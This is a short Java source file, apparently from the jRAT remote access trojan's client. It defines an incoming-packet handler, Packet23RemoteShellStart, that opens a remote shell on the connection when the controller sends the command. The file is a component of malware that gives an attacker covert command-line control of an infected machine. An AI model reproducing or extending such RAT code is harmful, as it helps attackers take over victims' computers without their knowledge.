package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.RemoteShell;

public class Packet23RemoteShellStart implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new RemoteShell(con).start();
	}

}
